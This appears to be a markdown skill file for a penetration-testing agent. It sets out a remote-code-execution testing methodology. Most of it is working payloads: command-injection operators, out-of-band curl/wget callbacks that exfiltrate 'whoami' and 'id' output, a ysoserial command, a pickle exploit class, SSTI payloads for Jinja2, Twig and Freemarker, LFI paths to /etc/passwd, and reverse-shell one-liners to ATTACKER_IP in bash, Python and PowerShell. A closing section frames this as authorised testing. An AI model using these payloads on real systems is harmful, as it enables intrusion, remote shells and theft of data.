---
name: rce
description: Remote Code Execution via command injection, deserialization, SSTI, file inclusion
applicable_contexts: [web, api, backend]
---

## RCE Testing Methodology

### OS Command Injection

#### Injection Operators
- Semicolon: `; whoami`
- Pipe: `| whoami`
- AND: `&& whoami`, `& whoami`
- OR: `|| whoami`
- Backticks: `` `whoami` ``
- Dollar substitution: `$(whoami)`
- Newline: `%0a whoami`

#### Blind Detection
```bash
# Time-based
; sleep 5
| ping -c 5 127.0.0.1
$(sleep 5)

# OOB
; curl http://COLLABORATOR_URL/$(whoami)
| nslookup $(whoami).COLLABORATOR_DOMAIN
; wget http://COLLABORATOR_URL/$(id|base64)
```

#### Common Injection Points
- Filename parameters, file conversion tools
- DNS/network utilities (ping, traceroute, nslookup)
- System commands exposed via API (git, imagemagick, ffmpeg)
- PDF generation, document conversion pipelines

### Deserialization Attacks

#### Java
```bash
# ysoserial — generate payloads
java -jar ysoserial.jar CommonsCollections1 'curl COLLABORATOR_URL' | base64

# Detect: look for base64-encoded Java serialized objects
# Marker: rO0AB (base64 of 0xACED0005)
```

#### Python (pickle)
```python
import pickle, os, base64
class Exploit:
    def __reduce__(self):
        return (os.system, ('curl COLLABORATOR_URL',))
payload = base64.b64encode(pickle.dumps(Exploit()))
```

#### PHP
```php
# Look for unserialize() with user input
# Exploit: craft serialized object with __wakeup() or __destruct()
O:8:"Classname":1:{s:4:"file";s:11:"/etc/passwd";}
```

### Server-Side Template Injection (SSTI)

#### Detection Polyglot
```
${{<%[%'"}}%\
{{7*7}}  →  49 = Jinja2/Twig
${7*7}   →  49 = Freemarker/Velocity
<%= 7*7 %> → 49 = ERB/EJS
#{7*7}   →  49 = Slim/Pug
```

#### Exploitation
```python
# Jinja2 → RCE
{{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}

# Twig (PHP)
{{['id']|filter('system')}}

# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}
```

### File Inclusion (LFI/RFI)

```
# LFI
../../../../../../etc/passwd
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd

# PHP wrappers
php://filter/convert.base64-encode/resource=config.php
php://input (POST body as code)
data://text/plain,<?php system('whoami');?>

# RFI
http://attacker.com/shell.txt
```

### Reverse Shell One-Liners

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python
python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("ATTACKER_IP",4444));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'

# PowerShell (Windows)
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"
```

### Validation Requirements

- Demonstrate command execution (show `whoami`, `id`, `hostname` output)
- For blind RCE: show OOB callback or time delay
- Document exact injection vector and payload
- Show scope: what OS user, what permissions, what data accessible
- Do NOT perform destructive actions (no rm, no service stops)

### Business Impact

- Complete system compromise
- Data exfiltration at OS level
- Lateral movement within infrastructure
- Ransomware deployment potential
- Regulatory breach (full infrastructure access)
